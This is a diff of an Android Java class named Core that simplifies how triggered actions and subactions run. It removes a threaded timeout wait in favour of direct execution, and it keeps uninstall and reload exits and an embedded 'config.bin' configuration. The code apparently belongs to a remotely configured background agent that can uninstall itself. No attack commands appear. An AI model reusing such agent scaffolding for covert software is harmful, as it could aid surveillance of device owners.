@@ -53,9 +53,6 @@ public class Core extends Activity implements Runnable {
 	/** The event manager. */
 	private EventManager eventManager;
 
-	/** The action thread. */
-	Thread actionThread;
-
 	/**
 	 * Start.
 	 * 
@@ -163,42 +160,26 @@ public class Core extends Activity implements Runnable {
 	private Exit checkActions() {
 		final Status status = Status.self();
 
-		Utils.sleep(1000);
-
 		try {
 			while (!bStopCore) {
-				// XXX DEBUG REMOVE
-				// if (0 != 1) {
-				// Utils.sleep(SLEEPING_TIME);
-				// continue;
-				// }
-
 				Log.d("QZ", TAG + " checkActions");
 				final int[] actionIds = status.getTriggeredActions();
 
-				final int asize = actionIds.length;
+				for (int actionId : actionIds) {
+					final Action action = status.getAction(actionId);
+					final Exit exitValue = executeAction(action);
 
-				if (asize > 0) {
-					for (int k = 0; k < asize; ++k) {
-						final int actionId = actionIds[k];
+					if (exitValue == Exit.UNINSTALL) {
+						Log.d("QZ", TAG + " Info: checkActions: Uninstall");
+						UninstallAction.actualExecute();
 
-						final Action action = status.getAction(actionId);
-						final Exit exitValue = executeAction(action);
+						return exitValue;
+					} else if (exitValue == Exit.RELOAD) {
+						Log.d("QZ", TAG + " checkActions: want Reload");
 
-						if (exitValue == Exit.UNINSTALL) {
-							Log.d("QZ", TAG + " Info: checkActions: Uninstall");
-							UninstallAction.actualExecute();
-
-							return exitValue;
-						} else if (exitValue == Exit.RELOAD) {
-							Log.d("QZ", TAG + " checkActions: want Reload");
-
-							return exitValue;
-						}
+						return exitValue;
 					}
 				}
-
-				// Utils.sleep(SLEEPING_TIME);
 			}
 
 			return Exit.STOP;
@@ -299,8 +280,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.inputStreamToBuffer(
-					resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -334,71 +314,44 @@ public class Core extends Activity implements Runnable {
 		Log.d("QZ", TAG + " CheckActions() triggered: " + action);
 		final Status status = Status.self();
 		status.unTriggerAction(action);
-		// action.setTriggered(false, null);
 
 		status.synced = false;
-		// final Vector subActions = action.getSubActionsList();
+
 		final int ssize = action.getSubActionsNum();
 		Log.d("QZ", TAG + " checkActions, " + ssize + " subactions");
 
-		for (int j = 0; j < ssize; ++j) {
+		int i = 1;
+		for( SubAction subAction : action.getSubActions()){
 			try {
-				final SubAction subAction = action.getSubAction(j);
-				Check.asserts(subAction != null,
-						"checkActions: subAction!=null");
-				// lastSubAction = subAction.toString();
 
 				/*
 				 * final boolean ret = subAction.execute(action
 				 * .getTriggeringEvent());
 				 */
-				Log.d("QZ", TAG + " Info: CheckActions() executing subaction ("
-						+ (j + 1) + "/" + ssize + ") : " + action);
-				// no callingEvent
+				Log.d("QZ", TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : "
+						+ action);
+
 				subAction.prepareExecute();
-				actionThread = new Thread(subAction);
-				actionThread.start();
-
-				synchronized (subAction) {
-					Log.d("QZ", TAG + " CheckActions() wait");
-
-					if (!subAction.isFinished()) {
-						// il wait viene chiamato solo se la start non e' gia'
-						// finita
-						subAction.wait(Configuration.TASK_ACTION_TIMEOUT);
-					}
-				}
-
-				boolean ret = true;
-
-				if (!subAction.isFinished()) {
-					ret = false;
-					actionThread.interrupt();
-					Log.d("QZ", TAG + " CheckActions() interrupted thread");
-				}
-
-				Log.d("QZ", TAG + " CheckActions() waited");
+				boolean ret = subAction.execute();
 
 				if (subAction.wantUninstall()) {
-					Log.d("QZ", TAG + " Warn: " + "CheckActions() uninstalling");
+					Log.d("QZ", TAG + " Warn: (CheckActions): uninstalling");
 					exit = Exit.UNINSTALL;
 					break;
 					// return false;
 				}
 
 				if (subAction.wantReload()) {
-
+					Log.d("QZ", TAG + " (CheckActions): reloading");
 					stopAll();
 
 					// return true;
 					exit = Exit.RELOAD;
 					break;
-
 				}
 
 				if (ret == false) {
-					Log.d("QZ", TAG + " Warn: " + "CheckActions() error executing: "
-							+ subAction);
+					Log.d("QZ", TAG + " Warn: " + "CheckActions() error executing: " + subAction);
 					continue;
 				}
 			} catch (final Exception ex) {
